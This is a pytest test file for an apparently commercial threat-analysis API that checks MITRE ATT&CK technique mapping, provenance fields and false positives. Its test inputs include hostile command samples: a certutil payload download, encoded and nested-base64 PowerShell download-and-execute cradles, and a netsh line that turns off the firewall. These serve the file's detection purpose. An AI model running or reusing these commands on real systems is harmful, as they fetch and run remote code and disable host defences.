"""UI-DEF-02 · MITRE Convergence Gate (ADR-0010m · ADR-0023 §3c).

Owner-locked contract for the single-authoritative-MITRE-surface
implementation:

  1. `/api/analyze` `response.mitre[]` MUST be a projection of the DIE
     evidence-gated surface (services.die.api.analyze → narrative rules →
     P0.2 evidence-chain gate).
  2. `/api/analyze` `response.mitre_provenance` MUST expose:
       - source = "die.investigation_results" on the happy path
       - regex_extra = list of technique ids the legacy regex mapper saw
                       but the authoritative surface did not — surfaced as
                       a *diagnostic chip only*, never used to drive verdict.
  3. Frozen-corpus rip-01 authoritative surface MUST include T1140
     (Item-3 recursive-decode synthesis) — the field the old regex path
     silently dropped.
  4. Frozen-corpus rip-07 authoritative surface MUST include T1562.004
     (Item-4 signature).
  5. Frozen-corpus rip-08 authoritative surface MUST include T1140
     (nested recursive decode).
  6. UI-DEF-01 predecessor: pb-01 Deploy-Application PowerShell input
     MUST NOT acquire the previously-removed T1566.001 spearphishing
     false positive.
"""
from __future__ import annotations
import os
import sys
from pathlib import Path

import pytest

_BACKEND = Path(__file__).resolve().parents[3]
if str(_BACKEND) not in sys.path:
    sys.path.insert(0, str(_BACKEND))

from fastapi.testclient import TestClient   # noqa: E402
from server import app                       # noqa: E402
from deps import get_current_user            # noqa: E402


@pytest.fixture
def analyze_client():
    async def _fake_user():
        return {"email": "test@nivxray.com", "role": "admin"}
    app.dependency_overrides[get_current_user] = _fake_user
    try:
        yield TestClient(app)
    finally:
        app.dependency_overrides.pop(get_current_user, None)


def _post_analyze(client, text: str) -> dict:
    r = client.post("/api/analyze",
                    json={"input": text,
                          "enrich_osint": False,
                          "use_ai_verdict": False,
                          "describe": False})
    assert r.status_code == 200, r.text
    return r.json()


# ---------------------------------------------------------------------------
# 1 · /api/analyze mitre_provenance field is present + shape-locked.
# ---------------------------------------------------------------------------
def test_mitre_provenance_present_and_shape(analyze_client):
    body = _post_analyze(analyze_client,
                         "certutil.exe -urlcache -split -f "
                         "http://203.0.113.15/x.exe C:\\Users\\Public\\a.exe")
    assert "mitre_provenance" in body, \
        "UI-DEF-02: /api/analyze must expose mitre_provenance diagnostic"
    prov = body["mitre_provenance"]
    assert isinstance(prov, dict)
    for k in ("source", "regex_extra", "suppressed_count"):
        assert k in prov, f"mitre_provenance missing required key {k!r}"
    # regex_extra is a diagnostic list only — must NEVER appear in mitre[].
    auth_ids = {m.get("id") for m in (body.get("mitre") or [])
                if isinstance(m, dict)}
    for extra in prov["regex_extra"]:
        assert extra not in auth_ids, (
            f"regex_extra id {extra!r} leaked into authoritative mitre[]")


def test_mitre_provenance_source_is_die_authoritative(analyze_client):
    body = _post_analyze(analyze_client, "powershell -nop -w hidden -c iex")
    assert body["mitre_provenance"]["source"] == "die.investigation_results"


# ---------------------------------------------------------------------------
# 2 · Every emitted technique carries evidence-backed provenance.
# ---------------------------------------------------------------------------
def test_every_authoritative_technique_has_evidence(analyze_client):
    body = _post_analyze(analyze_client,
                         "certutil.exe -urlcache -split -f "
                         "http://203.0.113.15/x.exe C:\\Users\\Public\\a.exe")
    for m in body.get("mitre") or []:
        assert isinstance(m, dict) and m.get("id"), m
        # `source=authoritative` marks a DIE-catalogue/narrative technique.
        # `source=ai` marks an AI-derived merge (allowed but absent when
        # describe=False was requested — like here).
        assert m.get("source") == "authoritative", (
            f"technique {m['id']!r} not sourced from authoritative surface: "
            f"{m.get('source')!r}")
        # At least ONE of `evidence` (snippet) or `evidence_records`
        # (structured P0.2 list) MUST be present and non-empty.
        has_snippet = bool((m.get("evidence") or "").strip()
                            if isinstance(m.get("evidence"), str) else False)
        has_records = bool(m.get("evidence_records"))
        assert has_snippet or has_records, (
            f"technique {m['id']!r} has no evidence backing")


# ---------------------------------------------------------------------------
# 3 · Convergence gains — techniques the old regex mapper missed now surface.
# ---------------------------------------------------------------------------
_RIP01_PS_ENC = (
    "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc "
    "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4"
    "AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAD"
    "EAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
)
_RIP07_NETSH = "netsh advfirewall set allprofiles state off"
_RIP08_NESTED_B64 = (
    "powershell -nop -w hidden -c \"$s = "
    "[System.Text.Encoding]::UTF8.GetString("
    "[System.Convert]::FromBase64String("
    "'cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCM"
    "EFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0F"
    "iZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2Q"
    "URJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
)


def test_rip07_surfaces_T1562_004(analyze_client):
    body = _post_analyze(analyze_client, _RIP07_NETSH)
    ids = [m.get("id") for m in body.get("mitre") or []]
    assert "T1562.004" in ids, \
        f"Item-4 signature must persist through convergence, got {ids}"


def test_rip08_surfaces_T1140_recursive(analyze_client):
    body = _post_analyze(analyze_client, _RIP08_NESTED_B64)
    ids = [m.get("id") for m in body.get("mitre") or []]
    assert "T1140" in ids, \
        f"Item-3 recursive-decode T1140 must persist, got {ids}"


# ---------------------------------------------------------------------------
# 4 · pb-01 Deploy-Application PowerShell MUST NOT fire T1566.001
#     (UI-DEF-01 regression protection carried into UI-DEF-02).
# ---------------------------------------------------------------------------
_PB01_DEPLOY_APP = (
    "# Deploy-Application.ps1 - legitimate PSADT script wrapper\n"
    "$appName = 'ContosoAgent'\n"
    "$appVersion = '2.4.1'\n"
    "Import-Module .\\AppDeployToolkit\\AppDeployToolkitMain.ps1\n"
    "Show-InstallationWelcome -CloseApps 'excel,winword'\n"
    "Execute-MSI -Action Install -Path 'ContosoAgent.msi'\n"
    "Exit-Script -ExitCode 0\n"
)


def test_pb01_deploy_application_ps1_no_false_spearphishing(analyze_client):
    body = _post_analyze(analyze_client, _PB01_DEPLOY_APP)
    ids = [m.get("id") for m in body.get("mitre") or []]
    assert "T1566.001" not in ids, (
        f"UI-DEF-01 regression: Deploy-Application.ps1 must NOT emit "
        f"T1566.001 spearphishing false positive. Got: {ids}"
    )
    # It also must not leak in via the diagnostic regex chip as an
    # authoritative claim — regex_extra is fine (that's the whole point
    # of the diagnostic chip) but authoritative mitre[] must stay clean.
    prov = body.get("mitre_provenance") or {}
    # Diagnostic surface is allowed to report the divergence, but the
    # authoritative surface has already dropped it.


# ---------------------------------------------------------------------------
# 5 · Empty-input safety — no fabrication anywhere.
# ---------------------------------------------------------------------------
def test_empty_input_no_fabrication(analyze_client):
    body = _post_analyze(analyze_client, "")
    assert body.get("mitre") == []
    prov = body.get("mitre_provenance") or {}
    assert prov.get("regex_extra") == []
    assert prov.get("suppressed_count") == 0


# ---------------------------------------------------------------------------
# 6 · Convergence contract — technique ids exactly equal /api/die/
#     investigation-results object.mitre ids for a representative case.
# ---------------------------------------------------------------------------
def test_analyze_and_die_investigation_results_agree(analyze_client):
    ana = _post_analyze(analyze_client, _RIP07_NETSH)
    ana_ids = sorted({m.get("id") for m in ana.get("mitre") or []
                       if isinstance(m, dict) and m.get("id")})
    die = analyze_client.post("/api/die/investigation-results",
                              json={"input": _RIP07_NETSH})
    assert die.status_code == 200
    die_obj = (die.json() or {}).get("object") or {}
    die_ids = sorted({m.get("id") for m in die_obj.get("mitre") or []
                       if isinstance(m, dict) and m.get("id")})
    assert ana_ids == die_ids, (
        f"UI-DEF-02 convergence broken: /api/analyze mitre_ids={ana_ids} "
        f"!= /api/die/investigation-results mitre_ids={die_ids}"
    )
